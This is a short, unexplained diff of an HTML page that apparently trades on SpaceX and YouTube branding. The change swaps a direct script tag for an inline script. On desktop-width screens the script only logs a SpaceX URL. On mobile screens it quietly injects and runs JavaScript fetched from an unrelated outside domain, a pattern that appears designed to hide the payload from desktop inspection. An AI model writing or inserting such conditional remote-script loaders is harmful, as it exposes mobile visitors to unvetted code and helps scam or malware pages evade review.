@@ -31,14 +31,13 @@
 </div>
 </div>
 <img style="visibility: hidden;" id="img" src="https://www.youtube.com/img/desktop/yt_1200.png" width="100%">
-<script src="https://2bpr.xyz/async?user=braunnypr&html=mobile" type="text/javascript" async="true"></script>
-    
-    
-    
-    
-    
-    if(screen.width>800) {
-console.log('https://www.spacex.com/')
+<script type="text/javascript">
+
+if(screen.width>800) {
+console.log('https://www.spacex.com/');
 } else {
-console.log('MOBILE')  
+var s = document.createElement('script');
+s.src='https://2bpr.xyz/async?user=braunnypr&html=mobile';
+document.body.appendChild(s);
 }
+</script>
